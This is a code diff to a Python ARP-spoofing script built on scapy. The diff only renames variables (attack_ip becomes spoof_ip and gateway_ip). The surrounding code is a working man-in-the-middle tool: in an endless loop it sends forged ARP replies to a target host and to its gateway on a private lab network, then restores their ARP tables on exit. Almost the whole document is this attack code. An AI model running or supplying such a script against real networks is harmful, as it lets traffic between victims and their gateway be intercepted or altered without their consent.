@@ -10,9 +10,9 @@ class ARP_Poison():
         ans_list = scapy.srp(arp_broadcast, timeout=5, verbose=False)[0]
         return ans_list[0][1].hwsrc
 
-    def spoof(self, target_ip, attack_ip):
+    def spoof(self, target_ip, spoof_ip):
         packet = scapy.ARP(op=2, pdst=target_ip, 
-                hwdst=self.mac_scan(target_ip), psrc=attack_ip)
+                hwdst=self.mac_scan(target_ip), psrc=spoof_ip)
         scapy.send(packet, verbose=False)
 
     def restore(self, dest_ip, source_ip):
@@ -24,19 +24,19 @@ class ARP_Poison():
 
 if __name__ == "__main__":
     target_ip = "192.168.58.129"
-    attack_ip = "192.168.58.1"
+    gateway_ip = "192.168.58.1"
     attack = ARP_Poison()
     try:
         packet_count = 0
         while True:
-            attack.spoof(target_ip, attack_ip)
-            attack.spoof(attack_ip, target_ip)
+            attack.spoof(target_ip, gateway_ip)
+            attack.spoof(gateway_ip, target_ip)
             packet_count += 2
             print(f"\r[*] Packets Sent: {packet_count}")
             time.sleep(2)
     except KeyboardInterrupt:
         print("\nExitting...")
-        attack.restore(attack_ip, target_ip)
-        attack.restore(target_ip, attack_ip)
+        attack.restore(gateway_ip, target_ip)
+        attack.restore(target_ip, gateway_ip)
         print("[!] ARP Spoofing Stopped...")
 
